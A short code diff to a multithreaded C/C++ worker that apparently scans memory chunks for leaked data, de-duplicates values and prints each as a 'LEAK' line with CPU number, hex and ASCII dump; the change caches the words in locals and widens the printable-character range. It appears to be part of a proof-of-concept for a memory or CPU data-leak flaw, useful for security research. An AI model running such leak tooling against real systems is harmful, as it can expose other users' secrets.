@@ -162,8 +162,12 @@ static void *worker(void *arg) {
       uint64_t *chunk = (uint64_t *)(buf + CHUNK_SIZE * j);
 
       // Check for leaked data in the lower 128 bits
-      std::array<uint64_t, 4> key = {chunk[4], chunk[5], chunk[6], chunk[7]};
-      if (chunk[4] != 0 || chunk[5] != 0 || chunk[6] != 0 || chunk[7] != 0) {
+      uint64_t data0 = chunk[4];
+      uint64_t data1 = chunk[5];
+      uint64_t data2 = chunk[6];
+      uint64_t data3 = chunk[7];
+      if (data0 != 0 || data1 != 0 || data2 != 0 || data3 != 0) {
+        std::array<uint64_t, 4> key = {data0, data1, data2, data3};
         if (seen.find(key) == seen.end()) {
           seen.insert(key);
 
@@ -178,9 +182,9 @@ static void *worker(void *arg) {
             pthread_mutex_lock(&lock);
             printf("[cpu %3d] LEAK chunk=%2d "
                    "data=0x%016lx_%016lx_%016lx_%016lx ascii=",
-                   cpu, j, chunk[7], chunk[6], chunk[5], chunk[4]);
+                   cpu, j, data3, data2, data1, data0);
             for (int i = 0; i < 28; i++) {
-              if (p[i] >= 0x20 && p[i] <= 0x73)
+              if (p[i] >= 0x20 && p[i] <= 0x7e)
                 putchar(p[i]);
               else
                 putchar('.');
